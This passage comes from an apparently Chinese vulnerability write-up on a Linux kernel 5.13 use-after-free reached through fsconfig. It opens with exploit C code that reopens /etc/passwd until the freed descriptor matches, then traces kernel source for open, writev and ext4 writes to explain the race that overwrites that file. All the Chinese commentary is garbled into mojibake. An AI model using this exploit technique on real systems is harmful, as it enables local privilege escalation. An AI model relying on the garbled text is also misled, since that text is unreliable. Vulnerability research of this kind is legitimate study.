Â  Â Â  Â Â Â if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
Â  Â Â  Â Â  Â Â  Â 0) {
Â  Â Â  Â Â  Â Â  Â found = 1;
Â  Â Â  Â Â  Â Â  Â printf("[!] found, file id %d\n", i);
Â  Â Â  Â Â  Â Â  Â for (int j = 0; j < i; j++)
Â  Â Â  Â Â  Â Â  Â Â  Â  close(fds[j]);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  if (found) {
Â  Â Â  Â Â Â sleep(4);
Â  Â Â  Â Â Â return 0;
Â  Â  }
Â  Â  return -1;
}
```  
  
è¿ç»­åœ°æ‰“å¼€Â /etc/passwdÂ æ–‡ä»¶ï¼Œåˆ¤æ–­æ–‡ä»¶æè¿°ç¬¦å’ŒÂ uaf_fdÂ æ˜¯å¦ä¸ºåŒä¸€æ–‡ä»¶ï¼Œå¦‚æœæ˜¯é‚£ä¹ˆè®¾ç½®Â found=1ã€‚  
  
åœ¨è¿™ä¸ªåœ°æ–¹è§¦å‘äº†æ¼æ´å¯¼è‡´äº† uaf æ–‡ä»¶æè¿°ç¬¦å†™å…¥äº†Â /etc/passwdÂ æ–‡ä»¶ã€‚  
## æºç åˆ†æ  
  
é€‰ç”¨å¯¹åº”æºç ç‰ˆæœ¬ï¼šhttps://elixir.bootlin.com/linux/v5.13.3/source  
### open  
  
åœ¨åˆ©ç”¨ä¸­çº¿ç¨‹ 1 ï¼ˆå±€éƒ¨å˜é‡Â fdï¼‰å’Œçº¿ç¨‹ 2 ï¼ˆå…¨å±€å˜é‡Â uaf_fdï¼‰éƒ½æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼ˆ./uafï¼‰ï¼Œå¦‚æœÂ uafÂ æ˜¯æ™®é€šæ–‡ä»¶ï¼Œé‚£ä¹ˆÂ FMODE_ATOMIC_POSÂ è¿™ä¸ªæ ‡å¿—ä½å¿…å®šå­˜åœ¨ï¼Œä½†æ˜¯å¦‚æœæ˜¯é“¾æ¥æ–‡ä»¶ï¼Œåˆ™è¿™é‡Œä¸ä¼šè¢«è®¾ç½®è¿™ä¸ªæ ‡è®°ï¼Œå¯ä»¥é¿å…è¢«å¡åœ¨è¿™ä¸ªå‡½æ•°ã€‚  
  
å…·ä½“çš„ä»£ç å¯ä»¥æŸ¥çœ‹Â openÂ å‡½æ•°çš„è°ƒç”¨ï¼Œç›¸å…³è§£é‡Šå·²åŠ æ³¨é‡Šã€‚  
```
static int do_dentry_open(struct file *f,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â struct inode *inode,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â int (*open)(struct inode *, struct file *))
{
Â  Â  static const struct file_operations empty_fops = {};
Â  Â  int error;

Â  Â  path_get(&f->f_path);
Â  Â  f->f_inode = inode;
Â  Â  f->f_mapping = inode->i_mapping;
Â  Â  f->f_wb_err = filemap_sample_wb_err(f->f_mapping);
Â  Â  f->f_sb_err = file_sample_sb_err(f);

Â  Â  if (unlikely(f->f_flags & O_PATH)) {
Â  Â Â  Â Â Â f->f_mode = FMODE_PATH | FMODE_OPENED;
Â  Â Â  Â Â Â f->f_op = &empty_fops;
Â  Â Â  Â Â Â return 0;
Â  Â  }

Â  Â  if (f->f_mode & FMODE_WRITE && !special_file(inode->i_mode)) {
Â  Â Â  Â Â Â error = get_write_access(inode);
Â  Â Â  Â Â Â if (unlikely(error))
Â  Â Â  Â Â  Â Â  Â goto cleanup_file;
Â  Â Â  Â Â Â error = __mnt_want_write(f->f_path.mnt);
Â  Â Â  Â Â Â if (unlikely(error)) {
Â  Â Â  Â Â  Â Â  Â put_write_access(inode);
Â  Â Â  Â Â  Â Â  Â goto cleanup_file;
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â f->f_mode |= FMODE_WRITER;
Â  Â  }

Â  Â  /* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */
Â  Â  if (S_ISREG(inode->i_mode) || S_ISDIR(inode->i_mode))
Â  Â Â  Â Â Â f->f_mode |= FMODE_ATOMIC_POS;
//è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ‰“å¼€çš„æ–‡ä»¶æ˜¯ç›®å½•ï¼ˆDIRï¼‰ç±»å‹æˆ–è€…æ˜¯å¸¸è§„ï¼ˆREGï¼‰ç±»å‹çš„æ–‡ä»¶ï¼Œåˆ™å¿…å®šåŠ ä¸Šä¸€ä¸ª FMODE_ATOMIC_POS æ ‡è®°ï¼Œå› æ­¤éœ€è¦é€šè¿‡å»ºç«‹é“¾æ¥æ¥ç»•è¿‡
Â  Â  f->f_op = fops_get(inode->i_fop);
Â  Â  if (WARN_ON(!f->f_op)) {
Â  Â Â  Â Â Â error = -ENODEV;
Â  Â Â  Â Â Â goto cleanup_all;
Â  Â  }
//...è¿™é‡Œçœç•¥äº†å¾ˆå¤šä»£ç 
cleanup_all:
Â  Â  if (WARN_ON_ONCE(error > 0))
Â  Â Â  Â Â Â error = -EINVAL;
Â  Â  fops_put(f->f_op);
Â  Â  if (f->f_mode & FMODE_WRITER) {
Â  Â Â  Â Â Â put_write_access(inode);
Â  Â Â  Â Â Â __mnt_drop_write(f->f_path.mnt);
Â  Â  }
cleanup_file:
Â  Â  path_put(&f->f_path);
Â  Â  f->f_path.mnt = NULL;
Â  Â  f->f_path.dentry = NULL;
Â  Â  f->f_inode = NULL;
Â  Â  return error;
}
```  
### writev  
  
ä¸»è¦è¦åˆ†æçš„æ˜¯Â sys_writevã€‚  
```
SYSCALL_DEFINE3(writev, unsigned long, fd, const struct iovec __user *, vec,
Â  Â Â  Â Â  Â Â  Â Â  Â  unsigned long, vlen)
{
Â  Â  return do_writev(fd, vec, vlen, 0);
}
```  
  
æ·±å…¥è¿™ä¸ªå‡½æ•°æ¥çœ‹çœ‹  
```
static ssize_t do_writev(unsigned long fd, const struct iovec __user *vec,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  unsigned long vlen, rwf_t flags)
{
Â  Â  struct fd f = fdget_pos(fd);
Â  Â  ssize_t ret = -EBADF;

Â  Â  if (f.file) {
Â  Â Â  Â Â Â loff_t pos, *ppos = file_ppos(f.file);
Â  Â Â  Â Â Â if (ppos) {
Â  Â Â  Â Â  Â Â  Â pos = *ppos;
Â  Â Â  Â Â  Â Â  Â ppos = &pos;
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â ret = vfs_writev(f.file, vec, vlen, ppos, flags);
Â  Â Â  Â Â Â if (ret >= 0 && ppos)
Â  Â Â  Â Â  Â Â  Â f.file->f_pos = pos;
Â  Â Â  Â Â Â fdput_pos(f);
Â  Â  }

Â  Â  if (ret > 0)
Â  Â Â  Â Â Â add_wchar(current, ret);
Â  Â  inc_syscw(current);
Â  Â  return ret;
}
```  
  
çœ‹èµ·æ¥å…¶å®éå¸¸ç®€å•ï¼Œä¹Ÿå°±æ˜¯å…ˆæ ¹æ®æ–‡ä»¶æè¿°ç¬¦å»è·å– fd ç»“æ„ï¼Œfd ç»“æ„é‡Œé¢ç»´æŠ¤äº†å½“å‰æ‰“å¼€çš„æ–‡ä»¶çš„å†™æŒ‡é’ˆå’Œè¯»æŒ‡é’ˆï¼Œç¬¬ä¸€æ­¥å…ˆè·å–ï¼Œç„¶åè°ƒç”¨Â vfs_writevÂ å»å†™è¯¥æ–‡ä»¶ï¼Œéšåé‡Šæ”¾æ–‡ä»¶ç»“æ„ï¼Œå¦‚æœè¿”å›å€¼ >0ï¼Œåˆ™å¢åŠ å½“å‰æ–‡ä»¶å†™å…¥å­—ç¬¦æ•°ï¼ˆadd_wcharï¼‰ï¼Œå¢åŠ å½“å‰ç³»ç»Ÿè°ƒç”¨æ¬¡æ•°ï¼ˆinc_syscwï¼‰  
  
åŒæ ·ä»å¤´åˆ°å°¾æ¥çœ‹çœ‹å‡½æ•°å®šä¹‰ï¼Œé¦–å…ˆæ˜¯è¿™ä¸ªè·å–æ–‡ä»¶ç»“æ„çš„Â fdget_posï¼Œ  
```
static inline struct fd fdget_pos(int fd)
{
Â  Â  return __to_fd(__fdget_pos(fd));
}
```  
  
ç„¶åå†æ·±å…¥çœ‹çœ‹Â __to_fdÂ å’ŒÂ __fget_posÂ å‡½æ•°ã€‚  
```
static inline struct fd __to_fd(unsigned long v)
{
Â  Â  return (struct fd){(struct file *)(v & ~3),v & 3};
}
```  
  
æ— ç–‘Â __to_fdÂ å‡½æ•°å°†è·å¾—çš„æ–‡ä»¶ç»“æ„Â struct fileÂ è½¬ä¸ºÂ struct fdã€‚  
  
__fdget_posÂ å°±åº”å½“æ˜¯æ ¹æ®æ–‡ä»¶æè¿°ç¬¦æ¥è·å–æ–‡ä»¶ç»“æ„Â struct fileã€‚  
```
unsigned long __fdget_pos(unsigned int fd)
{
Â  Â  unsigned long v = __fdget(fd);
Â  Â  struct file *file = (struct file *)(v & ~3);

Â  Â  if (file && (file->f_mode & FMODE_ATOMIC_POS)) {
Â  Â Â  Â Â Â if (file_count(file) > 1) {
Â  Â Â  Â Â  Â Â  Â v |= FDPUT_POS_UNLOCK;
Â  Â Â  Â Â  Â Â  Â mutex_lock(&file->f_pos_lock);
Â  Â Â  Â Â Â }
Â  Â  }
Â  Â  return v;
}
```  
  
æ·±å…¥ä¸‹å»Â __fdgetÂ å¯ä»¥å‘ç°é‡Œé¢è°ƒç”¨äº†Â __fget_lightï¼Œç¬¬äºŒä¸ªå‚æ•°è¢«å›ºå®šä¸ºÂ FMODE_PATHï¼Œå¯¹äºè¿™ä¸ªå‡½æ•°å®šä¹‰ï¼š  
```
/* File is opened with O_PATH; almost nothing can be done with it */
#define FMODE_PATHÂ  Â Â  Â Â  Â Â  Â Â  Â  ((__force fmode_t)0x4000)
unsigned long __fdget(unsigned int fd)
{
Â  Â Â  Â Â Â return __fget_light(fd, FMODE_PATH);
}
/* * Lightweight file lookup - no refcnt increment if fd table isn't shared. * * You can use this instead of fget if you satisfy all of the following * conditions: * 1) You must call fput_light before exiting the syscall and returning control *Â  Â  to userspace (i.e. you cannot remember the returned struct file * after *Â  Â  returning to userspace). * 2) You must not call filp_close on the returned struct file * in between *Â  Â  calls to fget_light and fput_light. * 3) You must not clone the current task in between the calls to fget_light *Â  Â  and fput_light. * * The fput_needed flag returned by fget_light should be passed to the * corresponding fput_light. */
static unsigned long __fget_light(unsigned int fd, fmode_t mask)
{
Â  Â  struct files_struct *files = current->files;
Â  Â  struct file *file;

Â  Â  if (atomic_read(&files->count) == 1) {
Â  Â Â  Â Â Â file = files_lookup_fd_raw(files, fd);
Â  Â Â  Â Â Â if (!file || unlikely(file->f_mode & mask))
Â  Â Â  Â Â  Â Â  Â return 0;
Â  Â Â  Â Â Â return (unsigned long)file;
Â  Â  } else {
Â  Â Â  Â Â Â file = __fget(fd, mask, 1);
Â  Â Â  Â Â Â if (!file)
Â  Â Â  Â Â  Â Â  Â return 0;
Â  Â Â  Â Â Â return FDPUT_FPUT | (unsigned long)file;
Â  Â  }
}

```  
  
è¿™é‡Œä¹Ÿè§£é‡Šäº†è¿™ä¸ªå®çš„å®šä¹‰ï¼Œè¡¨ç¤ºæ–‡ä»¶å‡ ä¹ä¸èƒ½åšä»»ä½•æ“ä½œæ¯”å¦‚è¯´Â READ,WRITEï¼Œè€Œè¿™é‡Œçš„Â maskÂ åœ¨åé¢åˆ†ææ˜¯ç¦æ­¢çš„ä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶å…·æœ‰Â READÂ æƒé™ä½†æ˜¯Â maskÂ è¢«è®¾ç½®ä¸ºÂ FMODE_READï¼Œé‚£ä¹ˆåœ¨åç»­çš„è°ƒç”¨ä¸­ä¼šè¿”å›Â NULLã€‚  
  
å…ˆè·å–å½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼ˆcurrent->filesï¼‰ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶æè¿°ç¬¦è¡¨çš„å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸ºÂ 1Â ï¼ˆæè¿°ç¬¦è¡¨æ˜¯å¦å…±äº«ï¼‰ï¼Œå¦‚æœæ˜¯åˆ™è°ƒç”¨Â files_lookup_fd_rawÂ å»è·å–æ–‡ä»¶ç»“æ„æŒ‡é’ˆï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶æ“ä½œæ¨¡å¼çš„æ­£ç¡®æ€§ï¼Œéšåè¿”å›ã€‚  
```
/* * The caller must ensure that fd table isn't shared or hold rcu or file lock */
static inline struct file *files_lookup_fd_raw(struct files_struct *files, unsigned int fd)
{
Â  Â  struct fdtable *fdt = rcu_dereference_raw(files->fdt);

Â  Â  if (fd < fdt->max_fds) {
Â  Â Â  Â Â Â fd = array_index_nospec(fd, fdt->max_fds);
Â  Â Â  Â Â Â return rcu_dereference_raw(fdt->fd[fd]);
Â  Â  }
Â  Â  return NULL;
}
```  
  
æ ¹æ®æ³¨é‡Šä¹Ÿå¯ä»¥è®¤ä¸ºï¼Œéœ€è¦ä¿è¯æ–‡ä»¶æè¿°ç¬¦è¡¨æ²¡æœ‰è¢«å…±äº«è¿‡ï¼Œæˆ–è€…æ˜¯æŒæœ‰æ–‡ä»¶é”ã€‚ä¼šè¿”å›ä¸€ä¸ªÂ fdÂ è¡¨ä¸­çš„Â struct fileÂ ç»“æ„ï¼ˆfdt->fd[fd]ï¼‰ã€‚  
  
å¦‚æœå¼•ç”¨è®¡æ•°ä¸ä¸ºÂ 1ï¼Œåˆ™è°ƒç”¨Â __fgetÂ å»è·å–æŒ‡é’ˆï¼Œå…¶ä¸­ä¸»è¦æ˜¯è°ƒç”¨äº†Â __fget_filesÂ å‡½æ•°ã€‚  
```
#define get_file_rcu_many(x, cnt)Â  Â Â  Â Â Â \Â  Â Â  Â Â Â atomic_long_add_unless(&(x)->f_count, (cnt), 0)
static struct file *__fget_files(struct files_struct *files, unsigned int fd,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â fmode_t mask, unsigned int refs)
{
Â  Â  struct file *file;
Â  Â  rcu_read_lock();
loop:
Â  Â  file = files_lookup_fd_rcu(files, fd);
Â  Â  if (file) {
Â  Â Â  Â Â Â /* File object ref couldn't be taken.Â  Â Â  Â Â  Â Â  Â Â  Â Â Â * dup2() atomicity guarantee is the reasonÂ  Â Â  Â Â  Â Â  Â Â  Â Â Â * we loop to catch the new file (or NULL pointer)Â  Â Â  Â Â  Â Â  Â Â  Â Â Â */
Â  Â Â  Â Â Â if (file->f_mode & mask)
Â  Â Â  Â Â  Â Â  Â file = NULL;
Â  Â Â  Â Â Â else if (!get_file_rcu_many(file, refs))
Â  Â Â  Â Â  Â Â  Â goto loop;
Â  Â  }
Â  Â  rcu_read_unlock();

Â  Â  return file;
}
static inline struct file *__fget(unsigned int fd, fmode_t mask,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  unsigned int refs)
{
Â  Â  return __fget_files(current->files, fd, mask, refs);
}

```  
  
è¿™é‡Œçš„Â files_lookup_fd_rcuÂ ç›´æ¥å¯ä»¥è®¤ä¸ºæ˜¯è·å–æ–‡ä»¶ç»“æ„ä½“çš„ï¼Œéšååˆ¤æ–­é‡Œé¢æ˜¯å¦åŒ…å«ç¦æ­¢çš„æ¨¡å¼ï¼Œç„¶åå¢åŠ æ–‡ä»¶è®¡æ•°å¼•ç”¨ ï¼ˆget_file_rcu_manyï¼‰ã€‚  
  
å›è¿‡å¤´æ¥çœ‹çœ‹Â __fdget_posÂ å‡½æ•°  
```
unsigned long __fdget_pos(unsigned int fd)
{
Â  Â  unsigned long v = __fdget(fd);
Â  Â  struct file *file = (struct file *)(v & ~3);

Â  Â  if (file && (file->f_mode & FMODE_ATOMIC_POS)) {
Â  Â Â  Â Â Â if (file_count(file) > 1) {
Â  Â Â  Â Â  Â Â  Â v |= FDPUT_POS_UNLOCK;
Â  Â Â  Â Â  Â Â  Â mutex_lock(&file->f_pos_lock);
Â  Â Â  Â Â Â }
Â  Â  }
Â  Â  return v;
}
```  
  
è·å–åˆ°çš„æ–‡ä»¶æŒ‡é’ˆå°†æœ€ä½ä¸¤ä½ç½®ä¸º 0ï¼ˆå¯¹é½ï¼‰ï¼Œå¦‚æœè¢«è®¾ç½®äº†Â FMODE_ATOMIC_POSÂ ä¸” æ–‡ä»¶å¼•ç”¨å¤§äº 1ï¼Œé‚£ä¹ˆä¸Šé”ï¼Œåˆ°è¿™é‡Œï¼Œæ‰åˆ†æå®ŒÂ do_writevÂ çš„ç¬¬ä¸€å¥è¯ï¼Œæ¥çœ‹çœ‹æ¥ä¸‹æ¥çš„è¯­å¥ï¼Œé‡ç‚¹æ˜¯Â vfs_writevÂ å‡½æ•°ã€‚  
```
static ssize_t do_iter_write(struct file *file, struct iov_iter *iter,
Â  Â Â  Â Â  Â Â  Â Â  Â  loff_t *pos, rwf_t flags)
{
Â  Â Â  Â Â Â size_t tot_len;
Â  Â Â  Â Â Â ssize_t ret = 0;

Â  Â Â  Â Â Â if (!(file->f_mode & FMODE_WRITE))
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EBADF;
Â  Â Â  Â Â Â if (!(file->f_mode & FMODE_CAN_WRITE))
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;

Â  Â Â  Â Â Â tot_len = iov_iter_count(iter);
Â  Â Â  Â Â Â if (!tot_len)
Â  Â Â  Â Â  Â Â  Â Â  Â  return 0;
Â  Â Â  Â Â Â ret = rw_verify_area(WRITE, file, pos, tot_len);
Â  Â Â  Â Â Â if (ret < 0)
Â  Â Â  Â Â  Â Â  Â Â  Â  return ret;

Â  Â Â  Â Â Â if (file->f_op->write_iter)
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = do_iter_readv_writev(file, iter, pos, WRITE, flags);
Â  Â Â  Â Â Â else
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = do_loop_readv_writev(file, iter, pos, WRITE, flags);
Â  Â Â  Â Â Â if (ret > 0)
Â  Â Â  Â Â  Â Â  Â Â  Â  fsnotify_modify(file);
Â  Â Â  Â Â Â return ret;
}

static ssize_t vfs_writev(struct file *file, const struct iovec __user *vec,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â unsigned long vlen, loff_t *pos, rwf_t flags)
{
Â  Â  struct iovec iovstack[UIO_FASTIOV];
Â  Â  struct iovec *iov = iovstack;
Â  Â  struct iov_iter iter;
Â  Â  ssize_t ret;

Â  Â  ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &iov, &iter);
Â  Â  if (ret >= 0) {
Â  Â Â  Â Â Â file_start_write(file);
Â  Â Â  Â Â Â ret = do_iter_write(file, &iter, pos, flags);
Â  Â Â  Â Â Â file_end_write(file);
Â  Â Â  Â Â Â kfree(iov);
Â  Â  }
Â  Â  return ret;
}
```  
  
é¦–å…ˆæ ¹æ®Â writevÂ çš„ç»“æ„ä½“è§£å‡ºæ•°æ®å’Œé•¿åº¦ï¼Œç„¶åè°ƒç”¨Â do_iter_writeÂ å»å†™æ–‡ä»¶ï¼Œè€Œåœ¨Â do_iter_writeÂ ä¸­å¯ä»¥å‘ç°ï¼Œè¿™é‡Œä½œæƒé™æ ¡éªŒäº†ï¼Œæ ¡éªŒäº†æ˜¯å¦å¯å†™ä»¥åŠæ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å¯å†™ï¼Œè¿™é‡Œçš„ä¸¤å±‚æ„æ€åˆ†åˆ«æ˜¯æ–‡ä»¶æœ¬èº«æ˜¯å¦å…·æœ‰å¯å†™æƒé™ä»¥åŠä½ æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦åŒ…å«äº†Â O_WRITEÂ æƒé™ä½ã€‚  
  
éšåè¿›è¡Œå†™ï¼Œå†™çš„è¿‡ç¨‹ä¼šæ ¹æ®æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„å†™å‡½æ•°ï¼ˆwrite_iterï¼‰  
```
static inline ssize_t call_write_iter(struct file *file, struct kiocb *kio,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â struct iov_iter *iter)
{
Â  Â  return file->f_op->write_iter(kio, iter);
}
```  
  
ä¸‹é¢æ˜¯å®Œæ•´çš„è°ƒç”¨é“¾ï¼Œæ„Ÿå…´è¶£å¯ä»¥è·Ÿä¸€ä¸‹ã€‚  
  
do_writev->vfs_writev->do_iter_write->do_iter_readv_writev->call_write_iter->.write_iterÂ ->Â ext4_file_write_iterÂ ->Â ext4_buffered_write_iter  
  
åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢å¯ä»¥çœ‹åˆ°æˆ‘æ³¨é‡Šçš„ä¸¤ä¸ªä½ç½®åˆ†åˆ«å¯¹æ–‡ä»¶èŠ‚ç‚¹è¿›è¡Œäº†ä¸Šé”å’Œè§£é”ã€‚  
```
static ssize_t
Â  Â  ext4_file_write_iter(struct kiocb *iocb, struct iov_iter *from)
{
Â  Â  struct inode *inode = file_inode(iocb->ki_filp);

Â  Â  if (unlikely(ext4_forced_shutdown(EXT4_SB(inode->i_sb))))
Â  Â Â  Â Â Â return -EIO;

#ifdef CONFIG_FS_DAX
Â  Â  if (IS_DAX(inode))
Â  Â Â  Â Â Â return ext4_dax_write_iter(iocb, from);
#endif
Â  Â  if (iocb->ki_flags & IOCB_DIRECT)
Â  Â Â  Â Â Â return ext4_dio_write_iter(iocb, from);
Â  Â  else
Â  Â Â  Â Â Â return ext4_buffered_write_iter(iocb, from);
}
static ssize_t ext4_buffered_write_iter(struct kiocb *iocb,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  struct iov_iter *from)
{
Â  Â  ssize_t ret;
Â  Â  struct inode *inode = file_inode(iocb->ki_filp);

Â  Â  if (iocb->ki_flags & IOCB_NOWAIT)
Â  Â Â  Â Â Â return -EOPNOTSUPP;

Â  Â  ext4_fc_start_update(inode);
Â  Â  inode_lock(inode);//è¿™é‡Œä¼šä¸Šé”
Â  Â  ret = ext4_write_checks(iocb, from);
Â  Â  if (ret <= 0)
Â  Â Â  Â Â Â goto out;

Â  Â  current->backing_dev_info = inode_to_bdi(inode);
Â  Â  ret = generic_perform_write(iocb->ki_filp, from, iocb->ki_pos);
Â  Â  current->backing_dev_info = NULL;

Â  Â  out:
Â  Â  inode_unlock(inode);//è¿™é‡Œä¼šè§£é”
Â  Â  ext4_fc_stop_update(inode);
Â  Â  if (likely(ret > 0)) {
Â  Â Â  Â Â Â iocb->ki_pos += ret;
Â  Â Â  Â Â Â ret = generic_write_sync(iocb, ret);
Â  Â  }

Â  Â  return ret;
}
```  
  
æ­¤æ—¶ä¸¤ä¸ªçº¿ç¨‹ä¼šå¡åœ¨è¿™ä¸ªé”é‡Œï¼Œç¿»ä¸€ç¿»æ—¶é—´èŠ‚ç‚¹ï¼Œæ­¤æ—¶æƒé™æ ¡éªŒå·²ç»å®Œäº†ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹å†™å…¥å¤§é‡æ•°æ®å°†ç¬¬äºŒä¸ªçº¿ç¨‹è·å–é”çš„æ—¶é—´ï¼Œè¶æ­¤æœºä¼šç¬¬ä¸‰ä¸ªçº¿ç¨‹å°†Â /etc/passwdÂ æ‰“å¼€å¹¶å°†æ–‡ä»¶é¡µé¢ä»¥è¿™ä¸ªÂ uafÂ çš„é¡µé¢ä½¿ç”¨ï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è·å–é”ä¹‹åç›´æ¥å°†æ•°æ®å†™å…¥Â /etc/passwdã€‚  
  
æ‰€ä»¥è¦å½»åº•æ˜ç™½è¿™ä¸ªæ¼æ´ï¼Œè¿˜éœ€è¦ç†è§£å‰é¢ UAF çš„æˆå› ã€‚  
### fsconfig  
  
è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¤ªå¤§äº†ï¼Œåªä»‹ç»å®ƒåŸæœ‰çš„å«ä¹‰å’Œè§¦å‘æ¼æ´çš„ä½ç½®ã€‚  
```
SYSCALL_DEFINE5(fsconfig,
Â  Â Â  Â Â  Â Â  Â Â  Â  int, fd,
Â  Â Â  Â Â  Â Â  Â Â  Â  unsigned int, cmd,
Â  Â Â  Â Â  Â Â  Â Â  Â  const char __user *, _key,
Â  Â Â  Â Â  Â Â  Â Â  Â  const void __user *, _value,
Â  Â Â  Â Â  Â Â  Â Â  Â  int, aux)
{
Â  Â  struct fs_context *fc;
Â  Â  struct fd f;
Â  Â  int ret;
Â  Â  int lookup_flags = 0;

Â  Â  struct fs_parameter param = {
Â  Â Â  Â Â Â .typeÂ  Â Â  Â Â Â = fs_value_is_undefined,
Â  Â  };

Â  Â  if (fd < 0)
Â  Â Â  Â Â Â return -EINVAL;

Â  Â  switch (cmd) {
Â  Â Â  Â Â Â case FSCONFIG_SET_FLAG:
Â  Â Â  Â Â  Â Â  Â if (!_key || _value || aux)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_STRING:
Â  Â Â  Â Â  Â Â  Â if (!_key || !_value || aux)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_BINARY:
Â  Â Â  Â Â  Â Â  Â if (!_key || !_value || aux <= 0 || aux > 1024 * 1024)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_PATH:
Â  Â Â  Â Â Â case FSCONFIG_SET_PATH_EMPTY:
Â  Â Â  Â Â  Â Â  Â if (!_key || !_value || (aux != AT_FDCWD && aux < 0))
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_FD:
Â  Â Â  Â Â  Â Â  Â if (!_key || _value || aux < 0)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_CMD_CREATE:
Â  Â Â  Â Â Â case FSCONFIG_CMD_RECONFIGURE:
Â  Â Â  Â Â  Â Â  Â if (_key || _value || aux)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -EINVAL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â default:
Â  Â Â  Â Â  Â Â  Â return -EOPNOTSUPP;
Â  Â  }

Â  Â  f = fdget(fd);
Â  Â  if (!f.file)
Â  Â Â  Â Â Â return -EBADF;
Â  Â  ret = -EINVAL;
Â  Â  if (f.file->f_op != &fscontext_fops)
Â  Â Â  Â Â Â goto out_f;

Â  Â  fc = f.file->private_data;
Â  Â  if (fc->ops == &legacy_fs_context_ops) {
Â  Â Â  Â Â Â switch (cmd) {
Â  Â Â  Â Â  Â Â  Â case FSCONFIG_SET_BINARY:
Â  Â Â  Â Â  Â Â  Â case FSCONFIG_SET_PATH:
Â  Â Â  Â Â  Â Â  Â case FSCONFIG_SET_PATH_EMPTY:
Â  Â Â  Â Â  Â Â  Â case FSCONFIG_SET_FD:
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = -EOPNOTSUPP;
Â  Â Â  Â Â  Â Â  Â Â  Â  goto out_f;
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  if (_key) {
Â  Â Â  Â Â Â param.key = strndup_user(_key, 256);
Â  Â Â  Â Â Â if (IS_ERR(param.key)) {
Â  Â Â  Â Â  Â Â  Â ret = PTR_ERR(param.key);
Â  Â Â  Â Â  Â Â  Â goto out_f;
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  switch (cmd) {
Â  Â Â  Â Â Â case FSCONFIG_SET_FLAG:
Â  Â Â  Â Â  Â Â  Â param.type = fs_value_is_flag;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_STRING:
Â  Â Â  Â Â  Â Â  Â param.type = fs_value_is_string;
Â  Â Â  Â Â  Â Â  Â param.string = strndup_user(_value, 256);
Â  Â Â  Â Â  Â Â  Â if (IS_ERR(param.string)) {
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = PTR_ERR(param.string);
Â  Â Â  Â Â  Â Â  Â Â  Â  goto out_key;
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â param.size = strlen(param.string);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_BINARY:
Â  Â Â  Â Â  Â Â  Â param.type = fs_value_is_blob;
Â  Â Â  Â Â  Â Â  Â param.size = aux;
Â  Â Â  Â Â  Â Â  Â param.blob = memdup_user_nul(_value, aux);
Â  Â Â  Â Â  Â Â  Â if (IS_ERR(param.blob)) {
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = PTR_ERR(param.blob);
Â  Â Â  Â Â  Â Â  Â Â  Â  goto out_key;
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_PATH_EMPTY:
Â  Â Â  Â Â  Â Â  Â lookup_flags = LOOKUP_EMPTY;
Â  Â Â  Â Â  Â Â  Â fallthrough;
